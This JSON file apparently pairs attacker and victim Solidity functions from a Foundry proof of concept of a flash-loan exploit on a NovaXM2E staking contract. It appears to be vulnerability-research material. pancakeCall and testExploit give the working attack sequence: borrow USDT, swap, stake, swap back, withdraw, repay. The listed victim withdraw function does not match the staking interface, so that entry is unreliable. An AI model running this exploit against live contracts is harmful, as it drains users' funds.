[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "pancakeCall",
    "original_code": "    function pancakeCall(\n        address, /*sender*/\n        uint256, /*amount0*/\n        uint256, /*amount1*/\n        bytes calldata /*data*/\n    ) public {\n        swap_token_to_token(address(USDT), address(NovaXM2E), USDT.balanceOf(address(this)));\n        NovaXM2E.approve(address(tokenStake), NovaXM2E.balanceOf(address(this)));\n        tokenStake.stake(0, NovaXM2E.balanceOf(address(this)) / 2);\n        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));\n        uint256 stakeIndex = tokenStake.stakeIndex();\n        tokenStake.withdraw(stakeIndex);\n        swap_token_to_token(address(NovaXM2E), address(USDT), NovaXM2E.balanceOf(address(this)));\n        USDT.transfer(address(Pair), swapamount * 10_000 / 9975 + 1000);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", 41_116_210);\n        deal(address(USDT), address(this), 0);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public {\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance before exploit\", USDT.balanceOf(address(this)), 18);\n        swapamount = 500_000 ether;\n        Pair.swap(swapamount, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"[End] Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), 18);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ITokenStake",
    "source_type": "victim_contract",
    "function_name": "stake",
    "original_code": "    function stake(uint256 _poolId, uint256 _stakeValue) external override lock {\n        address stakeToken = stakeTokenPools[_poolId].stakeToken;\n        require(IERC20(stakeToken).balanceOf(msg.sender) >= _stakeValue, \"TS:E\");\n        require(IERC20(stakeToken).allowance(msg.sender, address(this)) >= _stakeValue, \"TS:A\");\n        require(IERC20(stakeToken).transferFrom(msg.sender, address(this), _stakeValue), \"TS:T\");\n\n        uint256 totalUserStakePool = totalUserStakedPoolToken[msg.sender][_poolId] + _stakeValue;\n        require(stakeTokenPools[_poolId].maxStakePerWallet == 0 || stakeTokenPools[_poolId].maxStakePerWallet >= totalUserStakePool, \"TS:U\");\n\n        // insert data staking\n        stakeIndex = stakeIndex + 1;\n        uint256 stakeValueUsd = tokenToUsd(stakeToken, _stakeValue);\n\n        // if pool duration = 0 => no limit for stake time, can claim every time\n        uint256 unlockTimeEstimate = stakeTokenPools[_poolId].duration == 0 ? 0 : (block.timestamp + (2592000 * stakeTokenPools[_poolId].duration));\n        stakedToken[stakeIndex].stakeId = stakeIndex;\n        stakedToken[stakeIndex].userAddress = msg.sender;\n        stakedToken[stakeIndex].poolId = _poolId;\n        stakedToken[stakeIndex].startTime = block.timestamp;\n        stakedToken[stakeIndex].lastClaimTime = block.timestamp;\n        stakedToken[stakeIndex].unlockTime = unlockTimeEstimate;\n        stakedToken[stakeIndex].totalValueStake = _stakeValue;\n        stakedToken[stakeIndex].totalValueStakeUsd = stakeValueUsd;\n        stakedToken[stakeIndex].isWithdraw = false;\n\n        // update fixed data\n        totalUserStakedPoolToken[msg.sender][_poolId] += _stakeValue;\n        totalUserStakedPoolUsd[msg.sender][_poolId] += stakeValueUsd;\n\n        payDirectCommission(msg.sender, _poolId, _stakeValue);\n        if (stakeTokenPools[_poolId].duration >= poolDurationHasLimit) {\n            IMarketplace(marketplaceContract).updateStakeTokenValue(msg.sender, stakeValueUsd, true);\n        }\n        emit Staked(stakeIndex, _poolId, msg.sender, _stakeValue, block.timestamp, unlockTimeEstimate);\n    }\n\n    function claimAll(uint256[] memory _stakeIds) external override lock {\n        require(_stakeIds.length > 0, \"TS:I\");\n        for (uint i = 0; i < _stakeIds.length; i++) {\n            claimInternal(_stakeIds[i]);\n        }\n    }\n\n    function claimPool(uint256[] memory _stakeIds) external override lock {\n        require(_stakeIds.length > 0, \"TS:I\");\n        for (uint i = 0; i < _stakeIds.length; i++) {\n            claimInternal(_stakeIds[i]);\n        }\n    }\n\n    function claim(uint256 _stakeId) external override lock {\n        claimInternal(_stakeId);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ITokenStake",
    "source_type": "victim_contract",
    "function_name": "stakeIndex",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ITokenStake",
    "source_type": "victim_contract",
    "function_name": "withdraw",
    "original_code": "    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n",
    "description": ""
  }
]